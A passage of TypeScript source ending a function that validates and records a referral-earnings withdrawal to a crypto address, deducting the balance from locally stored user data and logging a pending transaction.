  destinationAddress: string
): { user: User; tx: Transaction } {
  const refConfig = getReferralConfig();
  const minThreshold = refConfig.withdrawalThreshold || 50.0;

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === user.userId);
  if (uIdx === -1) throw new Error('User account not found.');

  const dbUser = users[uIdx];

  if (dbUser.referralEarnings < minThreshold) {
    throw new Error(`Minimum referral earnings withdrawal threshold is $${minThreshold.toFixed(2)}. Your current referral earnings: $${dbUser.referralEarnings.toFixed(2)}.`);
  }

  if (withdrawalAmount > dbUser.referralEarnings) {
    throw new Error(`Requested amount ($${withdrawalAmount.toFixed(2)}) exceeds available referral earnings ($${dbUser.referralEarnings.toFixed(2)}).`);
  }

  if (!destinationAddress.trim()) {
    throw new Error('A valid destination crypto address is required.');
  }

  dbUser.referralEarnings -= withdrawalAmount;
  users[uIdx] = dbUser;
  saveUsers(users);
  saveCurrentSession(dbUser);

  const txs = getTransactionsLocal();
  const newTx: Transaction = {
    id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
    userId: dbUser.userId,
    type: 'WITHDRAWAL',
    amount: withdrawalAmount,
    currency: 'USD',
    status: 'PENDING',
    timestamp: new Date().toISOString(),
    note: `Referral Withdrawal to ${destinationAddress.slice(0, 6)}...${destinationAddress.slice(-4)}`
  };

  txs.unshift(newTx);
  saveTransactions(txs);

  return { user: dbUser, tx: newTx };
}
